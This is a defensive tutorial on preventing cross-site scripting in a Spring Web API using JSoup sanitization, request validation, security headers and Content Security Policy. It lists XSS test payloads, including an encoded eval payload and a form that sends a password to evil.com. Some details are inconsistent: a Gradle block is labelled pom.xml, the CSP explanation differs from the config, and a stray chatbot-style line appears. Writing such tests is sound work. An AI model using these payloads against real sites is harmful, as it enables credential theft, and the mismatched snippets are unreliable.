# Mitigating XSS Attacks in Spring Web API

Cross-Site Scripting (XSS) is one of the most critical web security vulnerabilities. This tutorial shows you modern, industry-standard approaches to protect your Spring Web API from XSS attacks.

## Understanding XSS in API Context

XSS vulnerabilities occur when attackers inject malicious scripts into your application. While traditionally associated with web pages, APIs are vulnerable when they:

- Return data containing user input that's rendered in browsers
- Serve HTML content directly
- Provide data consumed by Single Page Applications (SPAs)
- Display error messages with unescaped user input

Common attack vectors include `<script>alert('XSS')</script>`, `<img src=x onerror='alert(1)'>`, and `<a href='javascript:alert(1)'>Click me</a>`.

## Modern Approach: JSoup Sanitization

The best practice for XSS prevention is **welcomelist-based sanitization** using JSoup. JSoup handles all edge cases including nested tags, encoded characters, and obscure XSS vectors.

### Step 1: Add JSoup Dependency

Add this to your `pom.xml`:

```xml
dependencies {
    implementation("org.jsoup:jsoup:1.22.1")
    implementation("org.springframework.boot:spring-boot-starter-validation")
}

```

### Step 2: Create a Sanitization Service

Create a service with different sanitization levels based on your needs:

```java
import org.jsoup.Jsoup;
import org.jsoup.safety.Safelist;
import org.springframework.stereotype.Service;

@Service
public class XSSSanitizerService {
    
    /**
     * Strips ALL HTML tags - safest for plain text input
     * Use for: usernames, titles, search queries, IDs
     */
    public String sanitizeStrict(String input) {
        if (input == null) return null;
        return Jsoup.clean(input, Safelist.none());
    }
    
    /**
     * Allows basic formatting tags only
     * Use for: comments, descriptions with minimal formatting
     */
    public String sanitizeBasic(String input) {
        if (input == null) return null;
        // Allows: b, em, i, strong, u, br, p, blockquote, a[href]
        return Jsoup.clean(input, Safelist.basic());
    }
    
    /**
     * Allows rich text with safe tags
     * Use for: blog posts, articles, rich text editors
     */
    public String sanitizeRichText(String input) {
        if (input == null) return null;
        // Allows: h1-h6, p, br, ul, ol, li, table, tr, td, a[href], img[src,alt]
        return Jsoup.clean(input, Safelist.relaxed());
    }
    
    /**
     * Custom whitelist for specific use cases
     */
    public String sanitizeCustom(String input) {
        if (input == null) return null;
        
        Safelist safelist = new Safelist()
            .addTags("p", "br", "strong", "em", "u", "a")
            .addAttributes("a", "href", "title")
            .addProtocols("a", "href", "https", "mailto");
        
        return Jsoup.clean(input, safelist);
    }
}
```

**Why JSoup is superior to manual escaping:**
- Handles complex attack vectors automatically
- Removes dangerous protocols like `javascript:`
- Strips event handlers (`onclick`, `onerror`, etc.)
- Deals with HTML entity encoding attacks
- Battle-tested and actively maintained
- Used by major companies and recommended by OWASP

### Step 3: Create Request DTOs with Validation

Always validate input before sanitization:

```java
import jakarta.validation.constraints.NotBlank;
import jakarta.validation.constraints.Size;
import com.fasterxml.jackson.annotation.JsonProperty;

public class CommentRequest {
    
    @NotBlank(message = "Content cannot be empty")
    @Size(max = 5000, message = "Content exceeds maximum length")
    @JsonProperty("content")
    private String content;
    
    @Size(max = 100, message = "Title too long")
    @JsonProperty("title")
    private String title;
    
    // Getters and setters
    public String getContent() { return content; }
    public void setContent(String content) { this.content = content; }
    public String getTitle() { return title; }
    public void setTitle(String title) { this.title = title; }
}
```

### Step 4: Implement Sanitization in Controllers

Apply sanitization at the controller layer:

```java
import org.springframework.http.ResponseEntity;
import org.springframework.validation.annotation.Validated;
import org.springframework.web.bind.annotation.*;
import jakarta.validation.Valid;

@RestController
@RequestMapping("/api/comments")
@Validated
public class CommentController {
    
    private final XSSSanitizerService sanitizer;
    
    public CommentController(XSSSanitizerService sanitizer) {
        this.sanitizer = sanitizer;
    }
    
    @PostMapping
    public ResponseEntity<CommentResponse> createComment(
            @Valid @RequestBody CommentRequest request) {
        
        // Sanitize user input - this removes ALL HTML
        String cleanContent = sanitizer.sanitizeStrict(request.getContent());
        String cleanTitle = sanitizer.sanitizeStrict(request.getTitle());
        
        // Save to database with cleaned content
        // ...
        
        CommentResponse response = new CommentResponse(1L, cleanTitle, cleanContent);
        return ResponseEntity.ok(response);
    }
    
    @PostMapping("/rich-text")
    public ResponseEntity<CommentResponse> createRichComment(
            @Valid @RequestBody CommentRequest request) {
        
        // Allow safe HTML formatting for rich content
        String cleanContent = sanitizer.sanitizeRichText(request.getContent());
        String cleanTitle = sanitizer.sanitizeStrict(request.getTitle());
        
        CommentResponse response = new CommentResponse(1L, cleanTitle, cleanContent);
        return ResponseEntity.ok(response);
    }
}
```

### Step 5: Configure Security Headers

Implement defense-in-depth with proper HTTP security headers:

```java
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.security.config.annotation.web.builders.HttpSecurity;
import org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;
import org.springframework.security.web.SecurityFilterChain;
import org.springframework.security.web.header.writers.XXssProtectionHeaderWriter;

@Configuration
@EnableWebSecurity
public class SecurityConfig {
    
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            .headers(headers -> headers
                // Content Security Policy - critical for XSS prevention
                .contentSecurityPolicy(csp -> csp
                    .policyDirectives(
                        "default-src 'self'; " +
                        "script-src 'self'; " +
                        "style-src 'self' 'unsafe-inline'; " +
                        "img-src 'self' data: https:; " +
                        "font-src 'self'; " +
                        "connect-src 'self'; " +
                        "frame-ancestors 'none'; " +
                        "base-uri 'self'; " +
                        "form-action 'self'"
                    )
                )
                // XSS Protection Header (legacy but still useful)
                .xssProtection(xss -> xss
                    .headerValue(XXssProtectionHeaderWriter.HeaderValue.ENABLED_MODE_BLOCK)
                )
                // Prevent MIME type sniffing
                .contentTypeOptions(contentType -> {})
                // Prevent clickjacking
                .frameOptions(frame -> frame.deny())
            )
            // CSRF - enable for stateful apps, disable for stateless REST APIs
            .csrf(csrf -> csrf.disable())
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/api/**").permitAll()
                .anyRequest().authenticated()
            );
        
        return http.build();
    }
}
```

**Understanding Content Security Policy (CSP):**
Here’s the CSP snippet again, with what **each line does** for XSS.

```text
default-src 'self';
```

* Fallback rule for all resource types not explicitly covered below.
* `'self'` means only load from the same origin as the page.
* XSS impact: prevents injected markup from pulling resources from random attacker domains unless you allow them later.

```text
script-src 'self';
```

* Controls where JavaScript can be loaded from.
* Blocks inline scripts by default (unless you add nonces/hashes or `unsafe-inline`).
* XSS impact: stops most XSS payloads from executing because injected `<script>...</script>` and event handlers need inline execution.

```text
style-src 'self';
```

* Controls where CSS can be loaded from.
* Blocks inline styles unless you add nonces/hashes or `unsafe-inline`.
* XSS impact: reduces CSS-based injection tricks and stops inline style injection from being used as a stepping stone.

```text
img-src 'self' https:;
```

* Controls where images can be loaded from.
* Allows same-origin images and any HTTPS image.
* XSS impact: limits exfil paths via image beacons and prevents loading images over insecure schemes. If you want tighter, replace `https:` with specific domains.

```text
connect-src 'self' https://api.example.com;
```

* Controls where the browser can make fetch/XHR/WebSocket/EventSource connections.
* Allows calls to your origin and your API domain.
* XSS impact: even if a script runs, it becomes harder to exfiltrate data to arbitrary endpoints because browser network calls are constrained.

```text
object-src 'none';
```

* Blocks plugins and “object/embed/applet” content entirely.
* XSS impact: removes an old but still useful attack surface and prevents fallback exploitation via plugin contexts.

```text
base-uri 'self';
```

* Controls what `<base href=...>` can be set to.
* XSS impact: prevents attackers from injecting a `<base>` tag that rewrites relative URLs to point to malicious domains.

```text
frame-ancestors 'none';
```

* Controls who is allowed to embed your site in an iframe.
* XSS impact: not direct XSS prevention, but it stops clickjacking setups that often get paired with injection and UI redress attacks.

If you tell me whether your React build needs any inline scripts or inline styles, I’ll adjust the CSP to stay strict without breaking the app.

### Step 6: Optional Global XSS Filter

For additional protection, implement a servlet filter that sanitizes all incoming requests:

```java
import jakarta.servlet.*;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletRequestWrapper;
import org.springframework.core.Ordered;
import org.springframework.core.annotation.Order;
import org.springframework.stereotype.Component;
import java.io.IOException;
import java.util.Arrays;

@Component
@Order(Ordered.HIGHEST_PRECEDENCE)
public class XSSFilter implements Filter {
    
    private final XSSSanitizerService sanitizer;
    
    public XSSFilter(XSSSanitizerService sanitizer) {
        this.sanitizer = sanitizer;
    }
    
    @Override
    public void doFilter(ServletRequest request, ServletResponse response, 
                        FilterChain chain) throws IOException, ServletException {
        
        XSSRequestWrapper wrappedRequest = 
            new XSSRequestWrapper((HttpServletRequest) request, sanitizer);
        
        chain.doFilter(wrappedRequest, response);
    }
    
    private static class XSSRequestWrapper extends HttpServletRequestWrapper {
        
        private final XSSSanitizerService sanitizer;
        
        public XSSRequestWrapper(HttpServletRequest request, 
                                XSSSanitizerService sanitizer) {
            super(request);
            this.sanitizer = sanitizer;
        }
        
        @Override
        public String getParameter(String parameter) {
            String value = super.getParameter(parameter);
            return sanitizer.sanitizeStrict(value);
        }
        
        @Override
        public String[] getParameterValues(String parameter) {
            String[] values = super.getParameterValues(parameter);
            if (values == null) return null;
            
            return Arrays.stream(values)
                        .map(sanitizer::sanitizeStrict)
                        .toArray(String[]::new);
        }
        
        @Override
        public String getHeader(String name) {
            String value = super.getHeader(name);
            return sanitizer.sanitizeStrict(value);
        }
    }
}
```

**Note:** Be cautious with global filters as they may interfere with legitimate use cases like file uploads or JSON payloads. Consider applying filters selectively.

### Step 7: Advanced Sanitization Patterns

For complex scenarios, customize JSoup's behavior:

```java
import org.jsoup.nodes.Document;
import org.jsoup.nodes.Entities;

@Service
public class AdvancedXSSSanitizer {
    
    /**
     * Sanitize with custom output encoding
     */
    public String sanitizeWithEncoding(String input) {
        if (input == null) return null;
        
        Document.OutputSettings outputSettings = new Document.OutputSettings()
            .escapeMode(Entities.EscapeMode.xhtml)
            .charset("UTF-8")
            .prettyPrint(false);
        
        return Jsoup.clean(input, "", Safelist.relaxed(), outputSettings);
    }
    
    /**
     * Allow specific attributes only
     */
    public String sanitizeWithAttributeControl(String input) {
        if (input == null) return null;
        
        Safelist safelist = Safelist.relaxed()
            .preserveRelativeLinks(false); // Force absolute URLs
        
        // Only allow href and title on links
        safelist.addAttributes("a", "href", "title");
        
        // Remove all other attributes
        safelist.addTags("img");
        safelist.addAttributes("img", "src", "alt");
        
        return Jsoup.clean(input, safelist);
    }
    
    /**
     * Sanitize for specific markup language (e.g., Markdown)
     */
    public String sanitizeMarkdown(String input) {
        if (input == null) return null;
        
        // First convert Markdown to HTML (use a library like commonmark)
        // Then sanitize the resulting HTML
        
        Safelist safelist = new Safelist()
            .addTags("p", "h1", "h2", "h3", "h4", "h5", "h6",
                    "ul", "ol", "li", "blockquote", "code", "pre",
                    "strong", "em", "a")
            .addAttributes("a", "href")
            .addAttributes("code", "class")
            .addProtocols("a", "href", "http", "https");
        
        return Jsoup.clean(input, safelist);
    }
}
```


## Common XSS Attack Vectors to Test

Make sure your sanitization handles these vectors:

```java
// Script injection
<script>alert('XSS')</script>

// Event handlers
<img src=x onerror='alert(1)'>
<body onload=alert('XSS')>

// JavaScript protocol
<a href='javascript:alert(1)'>Click</a>

// Data protocol
<img src="data:text/html,<script>alert('XSS')</script>">

// HTML entity encoding
<img src=x on&#101;rror='alert(1)'>

// SVG vectors
<svg onload=alert('XSS')>

// Form hijacking
<form action='https://evil.com'><input name='password'></form>

// CSS injection
<style>body{background:url('javascript:alert(1)')}</style>

// DOM-based XSS
<img src=x onerror='eval(atob("YWxlcnQoJ1hTUycp"))'>
```

## Context-Specific Sanitization

Choose the right sanitization level for your use case:

**Strict (no HTML)** - Use for:
- Usernames and display names
- Email addresses
- Search queries
- Database IDs
- File names
- URLs (path parameters)

**Basic (minimal formatting)** - Use for:
- User comments
- Product descriptions
- Short messages
- Feedback forms

**Rich Text (full formatting)** - Use for:
- Blog posts and articles
- Documentation
- Email content
- CMS content

**Custom** - Create custom whitelists for:
- Markdown rendering
- Code snippets (with syntax highlighting)
- Technical documentation
- Specialized content types

## Integration with Frontend

Coordinate with your frontend team for complete protection:

**Backend responsibilities:**
- Sanitize all input before storage
- Set proper security headers
- Validate and encode output

**Frontend responsibilities:**
- Use framework-provided auto-escaping (React, Vue, Angular all do this)
- Never use `dangerouslySetInnerHTML` or `v-html` without sanitization
- Implement CSP-compliant code (no inline scripts)
- Validate input on the client side (UX improvement, not security)

